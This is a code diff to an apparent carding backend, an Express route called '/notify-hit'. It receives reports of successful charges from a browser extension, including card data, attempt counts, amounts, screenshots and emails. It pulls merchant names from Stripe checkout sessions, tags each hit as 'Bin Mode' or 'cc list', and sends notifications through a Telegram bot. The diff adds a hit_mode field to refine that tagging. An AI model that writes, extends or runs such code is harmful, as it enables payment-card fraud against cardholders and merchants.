@@ -550,7 +550,7 @@ router.post('/notify-hit', async (req, res) => {
     console.warn('[HIT_NOTIFICATION] Bot token not configured - notifications will fail');
     // Don't reject, just log warning
   }
-  const { tg_id, name, card, attempts, amount, success_url, screenshot, email, time_sec, current_url, merchant_url, business_url } = req.body || {};
+  const { tg_id, name, card, attempts, amount, success_url, screenshot, email, time_sec, current_url, merchant_url, business_url, hit_mode } = req.body || {};
   // success_url is no longer sent by extension, so we can remove it from processing
   const tgId = String(tg_id || '').trim();
 
@@ -585,7 +585,7 @@ router.post('/notify-hit', async (req, res) => {
   let fullCheckoutUrl = '—';
 
   // Extract merchant name - prioritize business_url, then auto-fetch from checkout URL, then URL detection, then BIN detection
-  let merchantName = 'Online Store'; // Default - keep it short for notifications
+  let merchantName = 'Unknown Merchant'; // Default
   console.log('[HIT_NOTIFICATION] Extension data - current_url:', current_url, 'merchant_url:', merchant_url, 'business_url:', business_url);
 
   // Priority 1: business_url (exact merchant from Stripe checkout session - sent by extension)
@@ -636,9 +636,10 @@ router.post('/notify-hit', async (req, res) => {
         });
 
         if (response.status === 200 && response.data) {
-          // Extract merchant info
+          // Extract merchant info - use business_url directly
           if (response.data.account_settings && response.data.account_settings.business_url) {
             const businessUrl = response.data.account_settings.business_url;
+            // Use the full business_url as merchant name (remove https:// prefix)
             merchantName = businessUrl.replace(/^https?:\/\//, '').replace(/\/$/, '');
             console.log('[HIT_NOTIFICATION] ✅ CC SCRIPT SUCCESS: Merchant extracted as:', merchantName);
           } else if (response.data.account_settings && response.data.account_settings.display_name) {
@@ -792,15 +793,17 @@ router.post('/notify-hit', async (req, res) => {
 
   const cleanCard = cardDisplay !== '—' ? cardDisplay.replace(' | ', '').replace(/\s/g, '') : '';
 
-  // Determine BIN mode based on card data format
+  // Determine BIN mode from extension data
   let binMode = '(extension hit)';
-  if (cleanCard) {
-    // If card data is exactly 6 digits, it's BIN mode (user hit with BIN)
-    if (cleanCard.length === 6 && /^\d{6}$/.test(cleanCard)) {
+  if (hit_mode === 'bin_mode') {
+    binMode = '(Bin Mode)';
+  } else if (hit_mode === 'cc_list') {
+    binMode = '(cc list)';
+  } else {
+    // Fallback detection if mode not provided
+    if (cleanCard && cleanCard.length === 6 && /^\d{6}$/.test(cleanCard)) {
       binMode = '(Bin Mode)';
-    }
-    // If card data is longer than 6 digits, it's CC list mode (extract BIN from full card)
-    else if (cleanCard.length > 6) {
+    } else if (cleanCard && cleanCard.length > 6) {
       binMode = '(cc list)';
     }
   }
